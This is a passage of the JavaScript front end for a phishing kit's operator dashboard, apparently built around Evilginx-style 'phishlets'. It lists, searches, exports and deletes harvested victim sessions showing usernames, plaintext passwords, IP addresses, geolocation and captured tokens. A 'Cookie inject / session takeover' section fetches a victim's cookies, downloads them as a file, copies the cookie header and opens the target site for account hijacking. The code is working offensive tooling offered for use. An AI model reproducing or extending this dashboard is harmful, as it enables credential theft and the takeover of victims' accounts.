  applyFilters();
  updatePhishletChips(Array.from(new Set(allSessions.map(function(s){return s.phishlet}))));
}

function applyFilters() {
  var search = document.getElementById('searchInput').value.toLowerCase();
  var pl = document.getElementById('phishletFilter').value;
  var tok = document.getElementById('tokenFilter').value;

  filtered = allSessions.filter(function(s) {
    if (pl && s.phishlet !== pl) return false;
    if (tok === 'yes' && !hasTokens(s)) return false;
    if (tok === 'no' && hasTokens(s)) return false;
    if (search) {
      return (s.username||'').toLowerCase().includes(search) ||
             (s.password||'').toLowerCase().includes(search) ||
             (s.phishlet||'').toLowerCase().includes(search) ||
             (s.remote_addr||'').toLowerCase().includes(search) ||
             (s.useragent||'').toLowerCase().includes(search) ||
             (s.user_agent||'').toLowerCase().includes(search);
    }
    return true;
  });

  filtered.sort(function(a,b) {
    var va = a[sortField], vb = b[sortField];
    if (typeof va === 'string') va = va.toLowerCase();
    if (typeof vb === 'string') vb = vb.toLowerCase();
    if (va === undefined) va = '';
    if (vb === undefined) vb = '';
    if (va < vb) return sortAsc ? -1 : 1;
    if (va > vb) return sortAsc ? 1 : -1;
    return 0;
  });

  currentPage = 0;
  var fc = document.getElementById('filterCount');
  fc.textContent = filtered.length !== allSessions.length ? filtered.length + ' of ' + allSessions.length + ' sessions' : allSessions.length + ' sessions';
  renderTable();
}

function clearFilters() {
  document.getElementById('searchInput').value = '';
  document.getElementById('phishletFilter').value = '';
  document.getElementById('tokenFilter').value = '';
  applyFilters();
}

// --- Render ---
function renderTable() {
  var start = currentPage * pageSize;
  var page = filtered.slice(start, start + pageSize);
  var totalPages = Math.ceil(filtered.length / pageSize) || 1;
  document.getElementById('pageInfo').textContent = 'Page ' + (currentPage+1) + ' of ' + totalPages;

  if (page.length === 0) {
    document.getElementById('tbody').innerHTML = '<tr><td colspan="9"><div class="empty"><div class="empty-icon">&#128269;</div><p>No sessions match your filters.</p></div></td></tr>';
    return;
  }

  document.getElementById('tbody').innerHTML = page.map(function(s) {
    var time = s.create_time ? new Date(s.create_time*1000).toLocaleString() : '--';
    var tok = hasTokens(s);
    var sel = selectedIds.has(s.id) ? ' selected' : '';
    var ua = s.useragent || s.user_agent || '';
    return '<tr class="srow'+sel+'" data-id="'+s.id+'">' +
      '<td><input type="checkbox" class="chk row-chk" onchange="toggleSelect('+s.id+',this)" ' + (selectedIds.has(s.id)?'checked':'') + '></td>' +
      '<td class="cell-id" onclick="openDetail('+JSON.stringify(s).replace(/"/g,'&quot;')+')">' + (s.id||'-') + '</td>' +
      '<td onclick="openDetail('+JSON.stringify(s).replace(/"/g,'&quot;')+')" ><span class="tag tag-pl">' + esc(s.phishlet||'-') + '</span></td>' +
      '<td class="cell-mono cell-copy" title="Click to copy" onclick="copyText(\''+escQ(s.username||'')+'\',event)">' + esc(s.username||'--') + '</td>' +
      '<td class="cell-mono cell-copy tag-pw" title="Click to copy" onclick="copyText(\''+escQ(s.password||'')+'\',event)">' + (s.password ? esc(s.password) : '<span style="color:var(--dim)">--</span>') + '</td>' +
      '<td class="cell-mono">' + esc(s.remote_addr||'--') + '</td>' +
      '<td>' + (tok ? '<span class="tag tag-ok">captured</span>' : '<span class="tag tag-none">none</span>') + '</td>' +
      '<td style="color:var(--muted);font-size:11px;font-family:var(--mono)">' + time + '</td>' +
      '<td><button class="btn btn-sm btn-red" onclick="event.stopPropagation();deleteSession('+s.id+')">Del</button></td>' +
      '</tr>';
  }).join('');

  updateSelCount();
}

// --- Sorting ---
function sortBy(field) {
  if (sortField === field) { sortAsc = !sortAsc; }
  else { sortField = field; sortAsc = false; }
  ['id','phishlet','username','password','remote_addr','tokens','create_time'].forEach(function(f) {
    var el = document.getElementById('si-'+f);
    if (!el) return;
    el.textContent = sortField === f ? (sortAsc ? '&#9650;' : '&#9660;') : '';
    el.parentElement.classList.toggle('sorted', sortField === f);
  });
  renderTable();
}

// --- Selection ---
function toggleSelect(id, chk) {
  if (chk.checked) selectedIds.add(id); else selectedIds.delete(id);
  updateSelCount();
  var row = document.querySelector('tr[data-id="'+id+'"]');
  if (row) row.classList.toggle('selected', chk.checked);
}
function toggleSelectAll(chk) {
  var page = filtered.slice(currentPage*pageSize, currentPage*pageSize+pageSize);
  page.forEach(function(s){ if(chk.checked) selectedIds.add(s.id); else selectedIds.delete(s.id); });
  renderTable();
}
function updateSelCount() {
  var n = selectedIds.size;
  document.getElementById('selCount').textContent = n + ' selected';
  document.getElementById('bulkDelBtn').style.display = n > 0 ? '' : 'none';
}

// --- Actions ---
async function deleteSession(id) {
  if (!confirm('Delete session #'+id+'?')) return;
  try {
    var r = await fetch('/api/sessions/'+id, {method:'DELETE'});
    if (r.ok) { selectedIds.delete(id); await refreshSessions(); toast('Session #'+id+' deleted','ok'); }
    else toast('Delete failed','err');
  } catch(e) { toast('Delete failed','err'); }
}

async function bulkDelete() {
  var ids = Array.from(selectedIds);
  if (ids.length === 0) return;
  if (!confirm('Delete '+ids.length+' sessions?')) return;
  var ok=0;
  for (var i=0;i<ids.length;i++) {
    try {
      var r = await fetch('/api/sessions/'+ids[i], {method:'DELETE'});
      if (r.ok) ok++;
    } catch(e) {}
  }
  selectedIds.clear();
  await refreshSessions();
  toast(ok+' sessions deleted','ok');
}

async function deleteCurrentDetail() {
  if (!currentDetailId) return;
  await deleteSession(currentDetailId);
  closeDetail();
}

function prevPage() { if (currentPage > 0) { currentPage--; renderTable(); } }
function nextPage() { if ((currentPage+1)*pageSize < filtered.length) { currentPage++; renderTable(); } }

function exportCSV() { window.open('/api/sessions/export?format=csv'); }
function exportJSON() { window.open('/api/sessions/export?format=json'); }

// --- Detail panel ---
function openDetail(s) {
  currentDetailId = s.id;
  document.getElementById('detailTitle').textContent = 'Session #' + s.id + ' — ' + (s.phishlet||'');
  var ua = s.useragent || s.user_agent || '--';
  var allTok = Object.assign({}, s.tokens||{});
  var tokStr = Object.keys(allTok).length > 0 ? JSON.stringify(allTok, null, 2) : '(none)';
  var hasTok = hasTokens(s);

  document.getElementById('injectBtn').style.display = hasTok ? '' : 'none';

  var custom = s.custom || {};
  var geoLine = '--';
  if (custom.geo_country_name) {
    geoLine = (custom.geo_city_name ? custom.geo_city_name + ', ' : '') + custom.geo_country_name;
    if (custom.geo_isp) geoLine += ' — ' + custom.geo_isp;
    if (custom.geo_vpn === 'true') geoLine += ' [VPN]';
    if (custom.geo_datacenter === 'true') geoLine += ' [DC]';
  }

  var fields = [
    ['Username', s.username||'--'],
    ['Password', s.password||'--'],
    ['IP Address', s.remote_addr||'--'],
    ['Location', geoLine],
    ['Landing URL', s.landing_url||'--'],
  ];

  document.getElementById('detailBody').innerHTML =
    fields.map(function(f){
      return '<div class="detail-field"><label>'+esc(f[0])+'</label>' +
        '<div class="fval cell-mono" onclick="copyText(\''+escQ(f[1])+'\',event)" title="Click to copy">'+esc(f[1])+'</div></div>';
    }).join('') +
    '<div class="detail-field detail-ua"><label>User Agent</label><div class="fval" style="font-size:11px">'+esc(ua)+'</div></div>' +
    '<div class="detail-field detail-tokens"><label>Tokens ' +
      (hasTok ? '<span style="color:var(--green)">(captured)</span>' : '<span style="color:var(--dim)">(none)</span>') +
    '</label><pre>'+esc(tokStr)+'</pre></div>';

  document.getElementById('detailPanel').style.display = '';
  document.getElementById('detailPanel').scrollIntoView({behavior:'smooth',block:'nearest'});
}

function closeDetail() {
  document.getElementById('detailPanel').style.display = 'none';
  currentDetailId = null;
}

function copyAll() {
  if (!currentDetailId) return;
  var s = allSessions.find(function(x){return x.id===currentDetailId});
  if (!s) return;
  var t = 'Session #'+s.id+'\nPhishlet: '+s.phishlet+'\nUsername: '+s.username+'\nPassword: '+s.password+'\nIP: '+s.remote_addr+'\nTime: '+new Date(s.create_time*1000).toLocaleString();
  copyText(t, null);
}

// --- Utilities ---
function copyText(text, e) {
  if (e) e.stopPropagation();
  if (!text || text === '--') return;
  navigator.clipboard.writeText(text).then(function(){ toast('Copied','info'); }).catch(function(){});
}

function esc(str) {
  var d = document.createElement('div');
  d.textContent = String(str);
  return d.innerHTML;
}
function escQ(str) { return String(str).replace(/'/g,"\\'"); }

function toast(msg, type) {
  var el = document.getElementById('toast');
  el.textContent = msg;
  el.className = 'toast toast-'+type+' on';
  setTimeout(function(){ el.classList.remove('on'); }, 2500);
}

// --- Cookie inject / session takeover ---
var injectData = null;

async function injectSession() {
  if (!currentDetailId) return;
  try {
    var r = await fetch('/api/cookies/' + currentDetailId);
    if (!r.ok) { toast('Failed to fetch cookies', 'err'); return; }
    injectData = await r.json();
    downloadCookieFile(injectData);
    document.getElementById('injectCookieCount').textContent =
      injectData.count + ' cookies for ' + (injectData.phishlet || 'session') + ' ready to import.';
    if (injectData.target_url) {
      document.getElementById('openTargetBtn').textContent = 'Open ' + injectData.target_url;
    }
    document.getElementById('injectModal').style.display = 'flex';
  } catch(e) { toast('Inject error: ' + e, 'err'); }
}

function downloadCookieFile(data) {
  var json = JSON.stringify(data.cookies || [], null, 2);
  var blob = new Blob([json], {type: 'application/json'});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'session_' + data.session_id + '_cookies.json';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function reDownloadCookies() {
  if (injectData) downloadCookieFile(injectData);
}

function copyCookieHeader() {
  if (!injectData || !injectData.cookie_header) { toast('No cookie header available', 'err'); return; }
  copyToClipboard(injectData.cookie_header);
  toast('Cookie header copied', 'info');
}

function openTargetSite() {
  if (injectData && injectData.target_url) {
    window.open(injectData.target_url, '_blank');
  }
}

function closeInjectModal() {
  document.getElementById('injectModal').style.display = 'none';
}

// --- Sort indicator init ---
document.getElementById('si-create_time').innerHTML = '&#9660;';
document.querySelector('th[onclick="sortBy(\'create_time\')"]').classList.add('sorted');

// --- Boot ---
refreshSessions();
startAR();
</script>
</body>
</html>`
